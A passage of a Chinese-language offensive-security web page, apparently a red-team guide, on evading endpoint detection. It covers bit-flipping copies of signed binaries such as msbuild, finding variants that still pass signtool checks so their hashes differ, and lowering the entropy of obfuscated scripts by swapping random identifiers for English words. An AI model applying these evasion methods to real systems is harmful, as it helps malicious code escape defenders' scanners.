plain"> </span><span class="token string" style="color:#e3116c">&quot;wb&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	i </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;done&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦生成了位翻转列表，我们必须搜索文件中保持完整的唯一属性。例如，如果我们正在进行 <code>msbuild</code> 的位翻转，我们需要使用 <code>signtool</code> 搜索一个具有可用证书的文件。这将确保文件的功能不被破坏，并且应用程序将保持其签名属性。</p>
<p>我们可以利用脚本循环遍历位翻转列表，并验证功能变体。以下是批处理脚本实现的示例。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">FOR /L %%A IN (1,1,10000) DO (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	signtool verify /v /a flipped\\%%A.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这种技术可能非常有利可图，尽管它可能需要很长时间，并且只有在哈希被发现之前，才会有有限的有效期。以下是原始 MSBuild 应用程序与位翻转变体的比较。</p>
<p><img decoding="async" loading="lazy" alt="Image of WinMD5Free showing the hash of Original.exe" src="/assets/images/ab3f859f9dc34e6c4b41fe3437b2396d-1741756350850-15-3996ec4627d4557ebece5b89d17f92fa.png" width="499" height="232" class="img_ev3q"></p>
<p>👇</p>
<p><img decoding="async" loading="lazy" alt="Image of WinMD5Free showing the hash of Variant.exe" src="/assets/images/3e4c0050212e7c69d408135de36976a3-1741756350850-17-4a4f434bb596e5fca9c5164719ded8f5.png" width="499" height="235" class="img_ev3q"></p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="熵">熵<a href="#熵" class="hash-link" aria-label="Direct link to 熵" title="Direct link to 熵">​</a></h3>
<p>根据 <a href="https://www.ibm.com/docs/en/qsip/7.4?topic=content-analyzing-files-embedded-malicious-activity" target="_blank" rel="noopener noreferrer">IBM</a> 的定义，熵是“用于确定文件是否包含隐藏数据或可疑脚本的文件数据的随机性。”EDR 和其他扫描工具常常利用熵来识别潜在的可疑文件，或在整体恶意评分中贡献一部分。</p>
<p>熵对于混淆脚本来说可能是一个问题，特别是当混淆诸如变量或函数等可识别信息时。</p>
<p>为了降低熵，我们可以用随机选择的英文单词替换随机标识符。例如，我们可能将变量 <code>q234uf</code> 改为 <code>nature</code>。</p>
<p>为了证明更改标识符的有效性，我们可以使用 [CyberChef](<a href="https://gchq.github.io/CyberChef/#recipe=Entropy(&#x27;Shannon" target="_blank" rel="noopener noreferrer">https://gchq.github.io/CyberChef/#recipe=Entropy(&#x27;Shannon</a> scale&#x27;)) 观察熵值的变化。</p>
<p>以下是标准英文段落的香农熵尺度。</p>
<p><strong>Shannon entropy: 4.587362034903882</strong></p>
<p><img decoding="async" loading="lazy" alt="Status bar showing the entropy of an english paragraph" src="data:image/png;base64,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JnoAAI1Afnb09q9wRy/e02NHb+fu6H0iBzt6X8iyozeqxjt65s7c0ftOJTt6k7t+R2/oztrRm5VtR29sFTt606rZ0VtYwx29aKpnk72u2NHbWO2OnpkU+Dq1o9da+x29N2u5o2d2hLytQchjogcAAPVDznb04lM3K9zROyJpouefulnljl481YsvwlKTHb17aryjl3bqZl529LypXh539K6u8x29m7poR6/jtM1a7ejFQa9WO3pzq9/Rm55y2ma1O3oL87qjtyofO3ovp+3otZXf0Xujkh29LXW6o1dumpe2o1ftNI+JHgBAo9B1E709M0708rCj13HVzYw7et0r3NHrtbN39IblfEfvoc7t6HX2qpsV7ehVcNXNTDt642q8o1fiqpsfuCDLrtjRS5no5WVHr3D6ZgVX3cyyozev2h29JTXe0VtR4x29ElfdzMWOXpaJHjt6XHUTAGD3YxA9evTo0aNHjx49ejnb0aNHjx69Xdmjx44eAEBDkJ8dPXr06NGjR48ePXr06NGjR4+rbgIAQCPu6NGjR48ePXr06NGjR48ePXr06AEAQLXQo0ePHj169OjRo0ePHj169OjZaZuzOXUTAKBBoEePHj169OjRo0cvbzt69OjRo0ePHgAANMyOHj169bGjR48ePXr06NGjR49eDuoVyl2IpbPVCkz0AAAahZzt6NGjR48ePXr06NGjR48ePXr06AEAQLXQo0ePHj169OjRo0ePHj167Ogx0QMAaDDo0aNHjx49evTo0cvbjh49evTo0aMHAAANs6NHj1597OhdbF4ywvlJ81LzUyOdl40UvXyk6Kcfcn7GvMK88mHnZ82rHhF69OjRo0ePHj169NjRAwCAhtzRo0ePHj169OjRo0ePHj169OjRAwCAaqFHjx49evTo0aNHjx49evTY0WNHDwCgwaBHjx49evTo0aNHL287evTo0aNHjx4AADTMjh49evWxo0ePHj169OjRo0ePHj16AACQe3K2o0ePHj169OjRo0ePHj169OjRowcAANVCjx49evTo0aNHjx49evTosaPHjh4AQINBjx49evTo0aNHj17edvTo0aNHjx49AABomB09evTqY0ePHr2dt6PXEjlJ9LqJotdNEv3uJNHrzRsmO280b5rivHmK6C3mrVNEb5vqvN0cPE108FTRO6Y575wmete0HWFviHnPdOe95tDpovdFzpCu39Ezn5gtOtp8co5zjDl2rug4c7w5Ya7oxHnOSebk+aKT54lOmS861Zw2X/SpZ53Ty0z04rA32/TDXhj4OsLeItGFZiHsRUHPXOwFvqUW+JYtcUGvI+wtLQ57kauXia6JXC66drnoOnP9CmerucFsWym6caXoJnPzKucWs93cutq5rZMTvcgfrBN9wfzheuePzB+3On/SKvpi5AbRl1pFX97g/Kn5SpvzZ+arbaKvtYm+vtH5c/MXm5xvmG9uFn1rk+hbm0V/uVn0bfOdLc53zV+Zv24Xfc98v130N1udRRO9raK6TVS3mu3mFjPaz2NHDwAA8k/OdvTo0aNHjx49evTo0aNHjx49evQAAKBa6NGjR48ePXr06NGjR48ePXb02NEDAGgw6NGjR48ePXr06NHL244ePXr06NGjBwAADbOjR49efezo0aNHjx49evTo0aNHjx4AAOSenO3o0aNHjx49evTo0aNHjx49evToAQBAtdCjR48ePXr06NGjR48ePXrs6LGjBwDQYNCjR48ePXr06NGjl7cdPXr06NGjRw8AABpmR48evfrY0aNHjx49evTo0aNHjx09AADIPTnb0aNHjx49evTo0aNHjx49evTo0QMAgGqhR48ePXr06NGjR48ePXr02NFjRw8AoMGgR48ePXr06NGjRy9vO3r06NGjR48eAAA0zI4ePXr1saNHjx49evTo0aNHjx47egAAkHtytqNHjx49evTo0aNHjx49evTo0aMHAADVQo8ePXr06NGjR48ePXr06LGjx44eAECDQY8ePXr06NGjR49e3nb06NGjR48ePQAAaJgdPXr06mNHjx49evTo0aNHjx49dvQAACD35GxHjx49evTo0aNHjx49evTo0aNHDwAAqoUePXr06NGjR48ePXr06NFjR48dPQCABoMePXr06NGjR48evbzt6NGjR48ePXoAANAwO3r06NXHjh49evTo0aNHjx49euzoAQBA7snZjh49evTo0aNHjx49evTo0aNHjx4AAFQLPXr06NGjR48ePXr06NGjx44eO3oAAA0GPXr06NGjR48ePXp529GjR48ePXr0AACgYXb06NGrjx09evTo0aNHjx49evTY0QMAgNyTsx09evTo0aNHjx49evTo0aNHjx49AACoFnr06NGjR48ePXr06NGjR48d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" width="890" height="108" class="img_ev3q"></p>
<p>以下是一个包含随机标识符的小脚本的香农熵尺度。</p>
<p><strong>Shannon entropy: 5.341436973971389</strong></p>
<p><img decoding="async" loading="lazy" alt="Status bar showing the entropy of a small script with randomization" src="data:image/png;base64,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